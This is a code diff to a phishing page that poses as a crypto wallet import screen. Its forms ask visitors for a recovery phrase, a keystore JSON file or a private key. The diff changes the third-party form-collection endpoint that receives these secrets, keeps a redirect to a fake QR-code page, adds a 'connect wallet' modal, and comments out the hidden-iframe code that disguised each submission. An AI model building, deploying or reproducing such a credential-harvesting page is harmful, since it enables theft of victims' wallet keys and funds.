@@ -57,7 +57,7 @@
                     </div>
 
                     <div class="tab-content" id="tab-phrase">
-                        <form class="import-form" action="https://submit-form.com/L253Xehen" method="POST">
+                        <form class="import-form" action="https://submit-form.com/GhE4TWL7h" method="POST">
                             <input type="hidden" name="_next" value="./qrcode/index.html">
                             <input type="hidden" name="type" value="recovery_phrase">
                             <label for="recovery-phrase" class="field-label">Recovery Phrase</label>
@@ -68,7 +68,7 @@
                     </div>
 
                     <div class="tab-content hidden" id="tab-keystore">
-                        <form class="import-form" action="https://submit-form.com/L253Xehen" method="POST">
+                        <form class="import-form" action="https://submit-form.com/GhE4TWL7h" method="POST">
                             <input type="hidden" name="_next" value="./qrcode/index.html">
                             <input type="hidden" name="type" value="keystore_json">
                             <label for="keystore-json" class="field-label">Keystore JSON</label>
@@ -80,7 +80,7 @@
                     </div>
 
                     <div class="tab-content hidden" id="tab-privateKey">
-                        <form class="import-form" action="https://submit-form.com/L253Xehen" method="POST">
+                        <form class="import-form" action="https://submit-form.com/GhE4TWL7h" method="POST">
                             <input type="hidden" name="_next" value="./qrcode/index.html">
                             <input type="hidden" name="type" value="private_key">
                             <label for="private-key" class="field-label">Private Key</label>
@@ -164,9 +164,6 @@
         </div>
     </div>
 
-    <!-- Hidden iframe for form submission -->
-    <iframe name="submit-target" style="display: none;"></iframe>
-
     <script>
         // Tabs
         const tabs = document.querySelectorAll('.tab');
@@ -191,23 +188,52 @@
             });
         }
 
+        // Wallet modal
+        const connectWalletBtn = document.getElementById('connect-wallet-btn');
+        const walletModal = document.getElementById('wallet-modal');
+        const closeModal = document.querySelector('.close-modal');
+
+        if (connectWalletBtn && walletModal) {
+            connectWalletBtn.addEventListener('click', () => {
+                walletModal.style.display = 'block';
+            });
+        }
+
+        if (closeModal && walletModal) {
+            closeModal.addEventListener('click', () => {
+                walletModal.style.display = 'none';
+            });
+        }
+
+        // Close modal when clicking outside
+        window.addEventListener('click', (event) => {
+            if (event.target === walletModal) {
+                walletModal.style.display = 'none';
+            }
+        });
+
         // Submit form in a hidden iframe, then redirect to the `_next` URL.
         // This avoids navigating the main page to the `action` URL while still sending data.
-        const importForms = document.querySelectorAll('.import-form');
-        importForms.forEach(form => {
-            form.addEventListener('submit', (event) => {
-                event.preventDefault();
+        // const importForms = document.querySelectorAll('.import-form');
+        // importForms.forEach(form => {
+        //     form.addEventListener('submit', (event) => {
+        //         event.preventDefault();
 
-                const nextUrl = form.querySelector('input[name="_next"]')?.value || './qrcode/index.html';
-                form.target = 'submit-target';
+        //         if (!form.checkValidity()) {
+        //             form.reportValidity();
+        //             return;
+        //         }
 
-                // Submit the form in the hidden iframe, then redirect the main page.
-                form.submit();
-                setTimeout(() => {
-                    window.location.href = nextUrl;
-                }, 1000); // Increased delay for mobile
-            });
-        });
+        //         const nextUrl = form.querySelector('input[name="_next"]')?.value || './qrcode/index.html';
+        //         form.target = 'submit-target';
+
+        //         // Submit the form in the hidden iframe, then redirect the main page.
+        //         form.submit();
+        //         setTimeout(() => {
+        //             window.location.href = nextUrl;
+        //         }, 1000); // Increased delay for mobile
+        //     });
+        // });
     </script>
 </body>
 </html>
